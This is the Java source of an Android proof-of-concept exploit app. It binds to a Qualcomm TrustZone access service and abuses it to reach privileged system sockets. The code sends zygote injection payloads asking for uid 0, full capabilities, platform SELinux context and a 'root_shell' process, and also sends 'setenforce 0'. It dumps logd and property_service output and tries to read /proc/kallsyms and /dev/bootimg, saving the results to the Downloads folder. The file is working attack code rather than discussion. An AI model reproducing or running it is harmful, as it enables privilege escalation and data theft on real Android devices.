package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd mRemoteService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mRemoteService = IMinkSocketFd.Stub.asInterface(service);
            appendLog("Service bound");
            updateStatus("Bound - starting tests");
            enableButtons(false, true);
            stopRequested.set(false);
            testThread = new Thread(() -> executeFullTest());
            testThread.start();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            appendLog("Service disconnected");
            mRemoteService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);
        btnStart.setOnClickListener(v -> {
            if (!isBound && !isTesting.get()) bindService();
        });
        btnStop.setOnClickListener(v -> {
            if (isBound || isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        isTesting.set(true);
        appendLog("========== PHASE 1: Zygote Injection Tests ==========");

        // 1. Zygote への接続確認
        String zygotePath = "/dev/socket/zygote";
        boolean zygoteAvailable = tryConnect(zygotePath);
        appendLog("Zygote available: " + zygoteAvailable);

        if (zygoteAvailable) {
            // 複数のペイロードで注入テスト
            List<String> payloads = new ArrayList<>();
            payloads.add("help");
            payloads.add("status");
            payloads.add("version");
            payloads.add("getprop");
            payloads.add("list");
            payloads.add("dump");
            payloads.add("logcat -d");
            payloads.add("id");
            payloads.add("setenforce 0");
            payloads.add("dmesg");
            payloads.add("exit");
            payloads.add(""); // 空文字
            payloads.add("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
            payloads.add("1\n");
            payloads.add("--setuid=0 --setgid=0");
            payloads.add("--runtime-init");
            payloads.add("--runtime-init --nice-name=exploit");
            payloads.add("--setuid=0 --setgid=0 --runtime-init");
            payloads.add("--setuid=0 --setgid=0 --nice-name=root_shell");
            payloads.add("--setuid=1000 --setgid=1000");
            payloads.add("--setuid=0 --setgid=0 --capabilities=0xffffffff");
            payloads.add("--setuid=0 --setgid=0 --capabilities=0x3fffffffff");
            payloads.add("--setuid=0 --setgid=0 --nice-name=system_server");
            payloads.add("--setuid=0 --setgid=0 --runtime-init --nice-name=system_server");
            payloads.add("--setuid=0 --setgid=0 --seinfo=platform");
            payloads.add("--setuid=0 --setgid=0 --seinfo=platform --nice-name=system_server");
            payloads.add("--setuid=1000 --setgid=1000 --seinfo=platform");
            payloads.add("--setuid=0 --setgid=0 --seinfo=platform --nice-name=system_server --target-sdk-version=29");
            payloads.add("--setuid=0 --setgid=0 --seinfo=platform --nice-name=system_server --target-sdk-version=29 --runtime-init");

            interactWithZygote(zygotePath, payloads);
        }

        appendLog("========== PHASE 2: Logd & Property Service Dumps ==========");
        // 2. logd と property_service から情報取得
        dumpLogdAndProperties();

        appendLog("========== PHASE 3: Attempt File Dumps (Indirect) ==========");
        // 3. ファイルダンプ試行（間接的）
        attemptFileDumps();

        appendLog("========== All tests completed ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    private boolean tryConnect(String path) {
        if (mRemoteService == null) return false;
        try {
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = mRemoteService.a(path, iArr);
            if (pfd != null) {
                pfd.close();
                return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private void interactWithZygote(String path, List<String> payloads) {
        appendLog("--- Testing Zygote Injection ---");
        ParcelFileDescriptor pfd = null;
        try {
            int[] iArr = new int[1];
            pfd = mRemoteService.a(path, iArr);
            if (pfd == null) {
                appendLog("  Re-connect to zygote failed");
                return;
            }
            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
            if (fdesc == null || !fdesc.valid()) {
                appendLog("  Zygote FD invalid");
                pfd.close();
                return;
            }

            OutputStream os = new FileOutputStream(fdesc);
            InputStream is = new FileInputStream(fdesc);

            for (String payload : payloads) {
                if (stopRequested.get()) break;
                appendLog("  Sending: " + (payload.isEmpty() ? "(empty)" : payload.replace("\n", "\\n")));
                try {
                    os.write((payload + "\n").getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    String response = readWithTimeout(is, 500);
                    if (response != null && !response.isEmpty()) {
                        appendLog("  Response: " + response);
                    } else {
                        appendLog("  No response (timeout or empty)");
                    }
                } catch (Exception e) {
                    String err = e.getMessage();
                    appendLog("  Command failed: " + err);
                    if (err != null && (err.contains("EPIPE") || err.contains("Broken pipe"))) {
                        appendLog("  Socket closed, stopping zygote tests");
                        break;
                    }
                }
                try { Thread.sleep(100); } catch (InterruptedException ignored) {}
            }
            pfd.close();
        } catch (Exception e) {
            appendLog("  Zygote interaction exception: " + e.toString());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private void dumpLogdAndProperties() {
        String logd = "/dev/socket/logd";
        String prop = "/dev/socket/property_service";
        ParcelFileDescriptor pfd = null;
        try {
            // logd
            if (tryConnect(logd)) {
                appendLog("--- Dumping logd ---");
                int[] iArr = new int[1];
                pfd = mRemoteService.a(logd, iArr);
                if (pfd != null) {
                    java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
                    if (fdesc != null && fdesc.valid()) {
                        OutputStream os = new FileOutputStream(fdesc);
                        InputStream is = new FileInputStream(fdesc);
                        List<String> cmds = new ArrayList<>();
                        cmds.add("getLog");
                        cmds.add("status");
                        cmds.add("version");
                        for (String cmd : cmds) {
                            if (stopRequested.get()) break;
                            appendLog("  logd: " + cmd);
                            try {
                                os.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
                                os.flush();
                                String resp = readWithTimeout(is, 500);
                                if (resp != null && !resp.isEmpty()) {
                                    appendLog("  logd response: " + resp);
                                } else {
                                    appendLog("  logd: no response");
                                }
                            } catch (Exception e) {
                                appendLog("  logd command failed: " + e.getMessage());
                                break;
                            }
                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
                        }
                        // さらに、logcat -d を試す（プロトコルが違うかもしれない）
                        try {
                            os.write("logcat -d\n".getBytes(StandardCharsets.UTF_8));
                            os.flush();
                            String resp = readWithTimeout(is, 1000);
                            if (resp != null && !resp.isEmpty()) {
                                appendLog("  logcat -d response: " + resp);
                                // 保存
                                File logFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "logcat_from_logd.txt");
                                try (FileOutputStream fos = new FileOutputStream(logFile)) {
                                    fos.write(resp.getBytes(StandardCharsets.UTF_8));
                                }
                                appendLog("  Log saved to " + logFile.getAbsolutePath());
                            }
                        } catch (Exception e) {
                            appendLog("  logcat -d failed: " + e.getMessage());
                        }
                        pfd.close();
                    }
                }
            }
        } catch (Exception e) {
            appendLog("logd dump error: " + e.toString());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }

        // property_service
        try {
            if (tryConnect(prop)) {
                appendLog("--- Dumping property_service ---");
                int[] iArr2 = new int[1];
                pfd = mRemoteService.a(prop, iArr2);
                if (pfd != null) {
                    java.io.FileDescriptor fdesc2 = pfd.getFileDescriptor();
                    if (fdesc2 != null && fdesc2.valid()) {
                        OutputStream os2 = new FileOutputStream(fdesc2);
                        InputStream is2 = new FileInputStream(fdesc2);
                        List<String> propCmds = new ArrayList<>();
                        propCmds.add("getprop");
                        propCmds.add("list");
                        propCmds.add("status");
                        propCmds.add("version");
                        propCmds.add("getprop ro.build.version.sdk");
                        propCmds.add("getprop ro.build.version.release");
                        propCmds.add("getprop ro.product.model");
                        propCmds.add("getprop ro.product.brand");
                        propCmds.add("getprop ro.product.device");
                        for (String cmd : propCmds) {
                            if (stopRequested.get()) break;
                            appendLog("  prop: " + cmd);
                            try {
                                os2.write((cmd + "\n").getBytes(StandardCharsets.UTF_8));
                                os2.flush();
                                String resp = readWithTimeout(is2, 500);
                                if (resp != null && !resp.isEmpty()) {
                                    appendLog("  prop response: " + resp);
                                } else {
                                    appendLog("  prop: no response");
                                }
                            } catch (Exception e) {
                                appendLog("  prop command failed: " + e.getMessage());
                                break;
                            }
                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
                        }
                        // 全体のプロパティリストを取得試行（もし list で取れたら保存）
                        try {
                            os2.write("list\n".getBytes(StandardCharsets.UTF_8));
                            os2.flush();
                            String resp = readWithTimeout(is2, 1000);
                            if (resp != null && !resp.isEmpty()) {
                                File propFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "properties.txt");
                                try (FileOutputStream fos = new FileOutputStream(propFile)) {
                                    fos.write(resp.getBytes(StandardCharsets.UTF_8));
                                }
                                appendLog("  Properties saved to " + propFile.getAbsolutePath());
                            }
                        } catch (Exception e) {
                            appendLog("  property list failed: " + e.getMessage());
                        }
                        pfd.close();
                    }
                }
            }
        } catch (Exception e) {
            appendLog("property_service dump error: " + e.toString());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private void attemptFileDumps() {
        appendLog("--- Attempting to read /dev/bootimg and /proc/kallsyms via socket ---");
        String[] targets = {"/dev/bootimg", "/proc/kallsyms"};
        for (String filePath : targets) {
            appendLog("  Trying to read " + filePath);
            boolean done = false;
            // まず、各ソケットにコマンドとして送信してみる
            String[] socketsToTry = {"/dev/socket/logd", "/dev/socket/property_service", "/dev/socket/dnsproxyd"};
            for (String sock : socketsToTry) {
                if (done || stopRequested.get()) break;
                if (!tryConnect(sock)) continue;
                ParcelFileDescriptor pfd = null;
                try {
                    int[] iArr = new int[1];
                    pfd = mRemoteService.a(sock, iArr);
                    if (pfd == null) continue;
                    java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
                    if (fdesc == null || !fdesc.valid()) { pfd.close(); continue; }
                    OutputStream os = new FileOutputStream(fdesc);
                    InputStream is = new FileInputStream(fdesc);
                    String cmd = "cat " + filePath + "\n";
                    appendLog("    Sending via " + sock + ": cat " + filePath);
                    os.write(cmd.getBytes(StandardCharsets.UTF_8));
                    os.flush();
                    String resp = readWithTimeout(is, 2000);
                    if (resp != null && !resp.isEmpty() && !resp.contains("No such file") && !resp.contains("Permission denied")) {
                        appendLog("    Got response, saving...");
                        File outFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), new File(filePath).getName() + ".txt");
                        try (FileOutputStream fos = new FileOutputStream(outFile)) {
                            fos.write(resp.getBytes(StandardCharsets.UTF_8));
                        }
                        appendLog("    Saved to " + outFile.getAbsolutePath());
                        done = true;
                    } else {
                        appendLog("    No valid response (or permission denied)");
                    }
                    pfd.close();
                } catch (Exception e) {
                    appendLog("    Error on " + sock + ": " + e.getMessage());
                    if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
                }
            }
            if (!done) {
                appendLog("  Failed to retrieve " + filePath + " via any socket.");
            }
        }
    }

    private String readWithTimeout(InputStream is, int timeoutMs) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        long start = System.currentTimeMillis();
        byte[] buffer = new byte[512];
        try {
            while (System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int len = is.read(buffer);
                    if (len > 0) {
                        baos.write(buffer, 0, len);
                    } else {
                        break;
                    }
                } else {
                    Thread.sleep(30);
                }
            }
            return baos.toString(StandardCharsets.UTF_8.name());
        } catch (Exception e) {
            return null;
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "deep_socket_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZAccess Deep Socket PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) {
            try { unbindService(serviceConnection); } catch (Exception ignored) {}
        }
        saveLog();
    }
}
